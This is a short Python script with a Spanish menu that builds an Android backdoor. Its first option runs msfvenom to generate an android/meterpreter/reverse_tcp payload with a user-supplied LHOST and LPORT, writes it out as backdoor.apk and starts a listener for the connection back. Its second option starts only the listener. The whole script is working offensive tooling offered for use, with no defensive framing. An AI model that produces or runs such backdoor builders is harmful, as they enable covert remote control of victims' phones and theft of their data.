#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os 
import sys
import socket
sys.path.append('listener/')
from listener import *

print("""
		1.- Crear Backdoor 
		2.- Configurar Listener
""")

sel = input("Selecciona una opcion:")

if(sel=="1"):
    
		os.system("clear")
		lhost = input("LHOST: ")
		lport = input("LPORT: ")
		os.system("msfvenom -p  android/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > /home/fabricio/Desktop/backdoor.apk")
		print("Se genero el Backdoor.... ")
		listener()

if(sel=="2"):
	listener()
